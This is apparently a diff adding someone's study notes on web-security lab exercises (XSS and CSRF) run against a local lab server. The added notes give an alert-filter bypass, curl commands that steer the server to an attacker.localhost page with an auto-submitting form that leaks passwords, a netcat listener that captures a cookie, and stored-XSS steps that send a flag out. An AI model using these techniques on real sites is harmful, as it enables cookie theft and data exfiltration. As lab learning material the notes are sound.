@@ -756,3 +756,62 @@ payload = input_str + padding + input_str_hash
 - bruteforce to get canary
 - buffer overflow, but again too small, so have to go for env var
 - also similar stack pivot as we can't directly overwrite saved rip
+
+### lab 5c - xss/csrf
+
+- how to inject JS?
+  - URL-encoded - %xx
+  - event handlers - onload, onmouseover, etc.
+  - image tag with encoding (?)
+- CORS
+- XSS, CSP
+- CSRF, nonce
+
+### lab 5c.1 - alert me
+
+- simple XSS
+- regex validation, poorly done, only checks for `alert()`, can set `let a=alert;a()` or simply use some other dialog box
+- `curl http://lab.localhost/go?gourl='http://lab.localhost/echo?echo=<script>confirm("hi")</script>'`
+
+### lab 5c.2
+
+- even simpler?
+- leak endpoint provided...
+- `curl http://lab.localhost/go?gourl='http://lab.localhost/leak'`
+
+### lab 5c.3
+
+- CSRF token, given by program
+- but this time the `gourl` URL's hostname is restricted to `attacker.localhost`
+- then let's setup a flask server at this address and use it to redirect to the leak URL
+- `curl http://lab.localhost/go?gourl='http://attacker.localhost:9999/' -H "X-CSRF-Token: $(curl http://lab.localhost/get-csrf-token)"`
+
+### lab 5c.4
+
+- similar, instead of directly returning, it has an endpoint that puts passwords from `users` table into the `posts` table, which is publicly accessible
+- to trigger that, let's make a web server that returns a HTML form that auto-submits on page load, which hits that update endpoint
+- then make the challenge server go to it
+- `curl http://lab.localhost/go?gourl='http://attacker.localhost:9999/' -H "X-CSRF-Token: $(curl http://lab.localhost/get-csrf-token)"`
+- leaked, all that's left to do is view
+- `curl http://lab.localhost/view`
+
+### lab 5c.5
+
+- actly broken, `/profile` forgot to check for cookie
+- but let's see how it works
+
+- cookie but not a HTTP-only cookie
+- `nc -l 9999`
+- `curl http://lab.localhost/go?gourl='http://lab.localhost:9999'`
+- netcat server can see the cookie
+- use it in a request to `/profile`
+
+### lab 5c.6
+
+- stored XSS vuln
+- store the JS in the server
+- fetch that part from the server and the browser executes it
+- JS part:
+  - take flag from secret table and put it in public table
+  - get it and send it to a netcat server `nc lab.localhost -l 9999`
+- boom
